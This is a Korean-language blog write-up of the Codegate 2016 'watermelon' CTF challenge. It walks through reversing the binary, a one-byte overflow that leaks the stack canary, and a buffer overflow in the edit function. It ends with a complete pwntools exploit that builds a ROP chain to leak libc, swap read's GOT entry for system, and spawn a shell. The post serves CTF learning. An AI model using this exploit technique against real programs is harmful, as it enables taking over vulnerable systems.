---
layout: post
title: Codegate 2016 - watermelon writeup
---


어디선가 많이 들어본 문제였는데 이제서야 푼다.

먼저 바이너리를 분석해보겠다.

![](https://lh6.googleusercontent.com/CEtV2ySb1Pauqv7f_VM-0rTe_cxnMbRVegCVACPt4KPs9JG1jB7sY-XdIUWPcEL-ncouqfY9Lg0eyYnVtyqYXg6qlMSeG6BZSiodj1FUmu13aeyvNlp7ubi1LfUzwmFpUUDq950X)

elf 32bit파일이다

아이다로 분석해보겠다.

![](https://lh4.googleusercontent.com/kpgapWG54gF1cBHoRpW98281ljEVqJcUZfmgcGash-N2YrXJdn-Y02r0k0TQC4oavguAFHWsHtXpAE389gkPHdYeI87O4QcD99KHYTrhcCwwGWY16F4gLwfWlYdhdfiOMXD1HrfR)

메인함수이다.

일단 카나리가 있다.

일단 이름을 전역변수에 입력을 받고 그 이름을 출력해준다.

그리고는 무한로프를 돈다 먼저 switch의 인자값을 보면.

![](https://lh4.googleusercontent.com/R_80-ss1qaejL65YO7nsTZma0o1mxONDXdDYbOj4m-ZcI0hvrMzAPvsaoVR4w9S51VsuC4t9cL4Wy_m65kAvu3Q7AN3riHk4sUb1-7JbP1DpimcN4ReDtG8Upjj91himhDckxNDG)

메뉴를 보여주고 입력을 받고 리턴해준다.

menu로 rename하겠다.

![](https://lh4.googleusercontent.com/oWaj18XTB6EdXed26-V7wL-SI8r5Wt9b9Ia-2JN62lZdnbtviKn4nC19nEviWH8KUTQQAtC12D8YhHwADnJgaJR6bY56W3reaGRgtus17Pk5WiDrmrHgsWfDlsCA-IHlZlr4Z4eF)

case문을 보면 아마 메뉴에 맞는 각 함수들 일것이다.

근데 \xff\xff\xff\xff는 무엇일까.

바로 -1이다. 문제를 푸는데에는 지장없으니 넘어가겠다.

먼저 메뉴 1부터 보자.

case 1 같은 경우에는 v1의 주소를 인자로 넘겨준다.

![](https://lh5.googleusercontent.com/6kEWQ9ZDNyOdxiQ8ioJTbZOzMciZn5ivu-hkn8XP-8_3rJdnO2Oq3lq68WxGiGQs63eJH6kLh9jvmker7Q4n8HH-KnwkbAW497T0O_06bHhjw-NrTytDsedTg8Z-AsPFBxXNkZY4)

v1은 4400 바이트만큼의 크기를 할당 받는다.

다시 case 1의 함수를 보자.

![](https://lh5.googleusercontent.com/IGe6N2OBicZby9bJd84K_-puz3YwTK3nfNjARaQ-RntdATFc5wdLsfbW3GiUPlVL_CQk4ZMljxmOv4K-CTq9om0Eb2Hl_TROMuOKY9t_9JGPEaePEd8g6cyg7C2gDNA8lXfvsK0F)

add music을 보니 아마 추가해주는 것 같다.

dword_804cB88은 아마 list의 순번을 보여주는 그냥 카운트인것 같다. 근데 이 값이 100이 되면 FULL이라는 문구와 함께 뮤직이 추가가 되지 않는다.

먼저 read로 44* count + a1 +4 에 위치에 입력을 받는다. 맨처음 add할때는 count가 0일 것이다.

0을 삽입해보면 *(a1+4)에는 music의 name이 저장된다.

다음 read를 보자.

44* count + a1 +24에 count가 0 이면 *(a1+24)의 값은 artist의 name이 들어갈것이다.

따라서 music과 artist는 20byte(0x15)만큼 차이가 난다. 왜냐면 그만큼 read로 입력을 받으니깐.

그리고 --------------------------------\n\n을 출력후

44*count+a1(count가 0일때 a1) *a1에는 count+1 즉 출력되는 리스트 순번인 1이 저장된다.

count가 99일때 생각을 해보자. 하면 4400이 딱 맞아 떨어진다.

사실 이 함수에서 오버플로우가 발생하기는 한다.

하지만 핵심적인 오버플로우는 아직 못찾은 것 같다.

암튼 v1은 4400byte만큼 구조체인 것 같다.

{ 순번(4)|music(20)|artist(20) } * 99 하는 것 같다.

이만큼만 분석을 하고 2번 case를 분석해보자.

![](https://lh6.googleusercontent.com/NPKrOftvaExh4RNWyOGkyo8NF5j0a9a3SkS7EGAPl4qyt0Uev6SiJkVgGriWN_bGz_FanBDUef7hPIVLJfX6A7-x0BNKKMkT88_LH1cFeOxyO9zDAKfJZKxO96nJ4EmtDsEEUiTU)

마찬가지로 v1을 인자로 넘겨줘다.

뭐헷갈리겠지만 여기 되게 중요하다. 아까우리가 적었던 내용을 불러와서 view할 수 있게 해준다.

여기서 딱 느낌이 올거다. canary leak이 가능하다. 공교롭게도 4400바이트 다음 바로 카나리변수인 것 을 알수 있다. add list로 100까지 꽉꽉 채워준 후 1byte침범하면 카나리를 leak 할 수 있을 것 이다.

오케이 먼가 느낌이 온다.

세번째 case를 보자.

![](https://lh5.googleusercontent.com/sVhFOG1TK6zoc1XKVfFbZ70-Q47G8Kyt3bQirErjZIs2ziz3zvEeWL1wXqtYb5KetXtio6JPoTsaJwf-fqunSIsfugAMqP3U_w7R5kSBfQs7WMk6InJsaliTjaa-GivMnglir5Ml)

무려 추가했던 내용을 수정할 수 있다.

오잉? 근데 bof가 가능하다. 고로 마지막 list의 artist를 bof하여 rop하면 쉘을 얻을 수 있을 것이다.

(여기엔 system함수가 없어서 offset을 구해야 한다.

밑에는 페이로드이다.

```python
from pwn import  *

s = process("./watermelon")

e = ELF("./watermelon")

read_plt = e.plt['read']

read_got = e.got['read']

write_plt =  0x8048590

printf_plt =  0x8048500

pppr =  0x8048f0d

cmd =  0x804d7a0

printf_got =  0x804c010

s.recvuntil('Input your name : ')

s.sendline("/bin/sh\x00")

s.recvuntil('\tselect\t|\t')

for i in  range(0,100):

s.sendline('1')

s.recv()

s.send("asdf")

s.recv()

s.send("asdf")

s.recvuntil("\tselect\t|\t")

s.sendline('3')

s.recvuntil("select number\t|\t\n")

s.sendline('100')

s.recvuntil("\tmusic\t|\t")

s.send("asdf")

s.recv()

s.send("A"*21)

s.recvuntil("\tselect\t|\t\n")

s.sendline('2')

s.recvuntil('AAAAAAAAAAAAAAAAAAAAA')

canary =  '\x00'  + s.recv(3)

print ("[*]canary : 0x%x"%u32(canary))
```
# canary leak success
```python
s.recvuntil("\tselect\t|\t")

s.sendline('3')

s.recvuntil("select number\t|\t\n")

s.sendline('100')

s.recvuntil("\tmusic\t|\t")

s.send("asdf")

s.recv()
```
# leak_printf === payload
```python
leak_printf="A"*20

leak_printf+=canary

leak_printf+="A"*12

leak_printf+= p32(write_plt)

leak_printf+= p32(pppr)

leak_printf+= p32(1)

leak_printf+= p32(printf_got)

leak_printf+= p32(4)

leak_printf+= p32(read_plt)

leak_printf+= p32(pppr)

leak_printf+= p32(0)

leak_printf+= p32(read_got)

leak_printf+= p32(4)

#leak_printf+= "\x90\x94\x04\x08"

leak_printf+= p32(read_plt)

leak_printf+=  'AAAA'

leak_printf+= p32(cmd)

s.sendline(leak_printf)

s.recvuntil("\tselect\t|\t\n")

s.sendline('4')

s.recvuntil("\t\tBYE BYE\n\n")

#s.sendline('/bin/sh\x00')

#print(hex(u32(s.recv(4))))

printf = u32(s.recv(4))

#print("[*]printf : 0x%x"%(printf))

system = (printf) -  0xe6e0

#print("[*]system : 0x%x"%system)

s.send(p32(system))

s.interactive()
```
